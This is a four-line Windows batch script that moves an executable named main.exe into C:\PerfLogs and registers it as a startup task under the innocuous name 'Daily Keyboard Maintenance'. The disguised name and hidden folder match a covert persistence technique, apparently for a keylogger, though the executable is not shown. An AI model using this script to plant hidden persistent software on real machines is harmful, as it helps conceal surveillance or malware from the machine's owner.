:: Edit following variable for desired location
set location=C:\PerfLogs
move main.exe %location%
schtasks /create /sc ONSTART /tn "Daily Keyboard Maintenance" /tr %location%\main.exe
